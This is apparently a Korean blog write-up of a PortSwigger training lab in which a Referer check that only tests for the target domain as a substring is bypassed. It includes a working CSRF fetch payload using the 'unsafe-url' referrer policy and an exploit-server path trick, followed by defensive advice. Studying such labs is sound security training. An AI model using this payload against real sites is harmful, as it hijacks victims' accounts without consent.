+++
date = '2026-06-25T18:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - CSRF with broken Referer validation'
summary = "대상 도메인이 포함되기만 하면 통과하는 느슨한 Referer 검증을 exploit server 경로에 도메인을 넣고 unsafe-url 정책으로 전체 URL을 노출시켜 우회하는 풀이"
toc = true
tags = ["CSRF", "Referer Validation", "Referrer-Policy", "PortSwigger", "Practitioner"]
+++

---

## 문제 분석

> **난이도**: `PRACTITIONER`  
> **Lab**: [CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken)

> ![image.png](/writeup/portswigger/csrf/12/1.png)

이메일 변경 기능에 CSRF 취약점이 존재한다. 애플리케이션이 교차 도메인 요청을 감지해 차단하려 시도하지만 그 감지 메커니즘을 우회할 수 있다. CSRF 공격으로 피해자의 이메일 주소를 변경하면 문제가 해결된다. 실습 계정은 `wiener:peter`다.

### CSRF 진단

정상적으로 이메일을 변경하고 요청을 확인한다.

```http
POST /my-account/change-email HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=<session>
Content-Type: application/x-www-form-urlencoded
Origin: https://<lab-id>.web-security-academy.net
Sec-Fetch-Site: same-origin
Referer: https://<lab-id>.web-security-academy.net/my-account?id=wiener

email=csrf%40csrf.com
```

CSRF 토큰은 없고 세션 쿠키의 `SameSite`도 `None`이므로, 남은 방어는 Referer 검증뿐이다.

`Referer`의 도메인을 다른 값으로 바꾸면 `"Invalid referer header"`로 거부되고, [앞선 랩](/write-up/portswigger/csrf/write-up-portswigger---csrf-where-referer-validation-depends-on-header-being-present/)과 달리 헤더를 통째로 제거해도 차단된다. 헤더 존재 여부에 대한 폴백은 막혀 있다.

이번에는 검증이 값을 어떻게 비교하는지 확인한다. 스킴과 경로를 모두 제거하고 도메인 문자열만 남겨 보낸다.

```http
Referer: <lab-id>.web-security-academy.net
```

이것도 통과한다. 검증이 URL을 파싱해 호스트를 대조하는 것이 아니라, 문자열 안에 대상 도메인이 **포함되어 있는지**만 확인한다는 뜻이다.

그렇다면 앞부분은 공격자 도메인이고 뒷부분 경로에 대상 도메인이 들어간 URL도 통과해야 한다.

```http
Referer: https://<exploit-id>.exploit-server.net/<lab-id>.web-security-academy.net
```

실제로 검증을 통과한다.

---

## 익스플로잇

먼저 이메일 변경 `POST`를 보내는 페이로드를 구성한다.

```html
<script>
fetch("https://<lab-id>.web-security-academy.net/my-account/change-email", {
    method: "POST",
    credentials: "include",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    referrerPolicy: 'unsafe-url',
    body: "email=csrf2@csrf.com"
});
</script>
```

`referrerPolicy: 'unsafe-url'`을 지정한 이유는 참조자 정책의 기본값 때문이다. 최신 브라우저는 `strict-origin-when-cross-origin`을 기본으로 적용해 교차 출처 요청의 `Referer`를 출처(origin)까지만 축약해 보낸다. 그러면 경로가 잘려 검증을 통과할 도메인 문자열이 사라지므로, 전체 URL이 전달되도록 정책을 완화해야 한다.

다음으로 이 페이로드를 올릴 Exploit Server의 경로를 검증 통과 문자열이 포함되도록 지정한다.

```text
File: /<lab-id>.web-security-academy.net
```

피해자가 이 URL을 열면 페이지의 전체 주소가 `Referer`에 실리고, 그 안에 대상 도메인 문자열이 포함되어 검증을 통과한다.

이 페이로드를 피해자에게 전달하면 문제가 해결된다.

![image.png](/writeup/portswigger/csrf/12/2.png)

---

## 정리

이 랩의 결함은 검증을 문자열 포함 관계로 구현한 데 있다. URL은 구조를 가진 값이므로 신뢰 판단은 반드시 파싱한 뒤 호스트 컴포넌트를 정확히 비교해야 한다. 부분 문자열 검사는 호스트와 경로, 서브도메인과 접미사를 구분하지 못하므로 `attacker.com/target.com`이나 `target.com.attacker.com` 같은 값이 전부 통과한다.

흥미로운 점은 브라우저의 기본 참조자 정책이 이 공격을 한 번 막아선다는 것이다. `strict-origin-when-cross-origin`이 경로를 잘라내므로 공격자가 경로에 심어둔 문자열은 전달되지 않는다. 하지만 참조자 정책은 요청을 보내는 쪽이 정하는 값이고, 공격자가 자기 페이지의 정책을 `unsafe-url`로 완화하는 데 아무 제약이 없다. **공격자가 통제하는 값을 근거로 보안을 판단한다**는 Referer 검증의 근본 문제가 여기서 드러난다.

[앞선 Referer 랩](/write-up/portswigger/csrf/write-up-portswigger---csrf-where-referer-validation-depends-on-header-being-present/)과 묶어 보면 두 방향의 실패가 모두 확인된다. 헤더를 지워 검증을 건너뛰거나, 헤더를 유지한 채 검증 로직을 속이는 것이다. 공격자는 두 방향 모두를 자유롭게 선택할 수 있다.

방어는 Referer를 단독 근거로 삼지 않는 것이다. 검증을 유지한다면 URL을 파싱해 호스트를 허용 목록과 정확히 대조하고, 값이 없으면 실패로 처리해야 한다. 다만 그렇게 해도 우회 여지가 남으므로 세션에 결합된 CSRF 토큰과 `SameSite` 제한을 주 방어로 두고, Referer·`Origin` 검증은 보조 수단으로만 사용해야 한다.
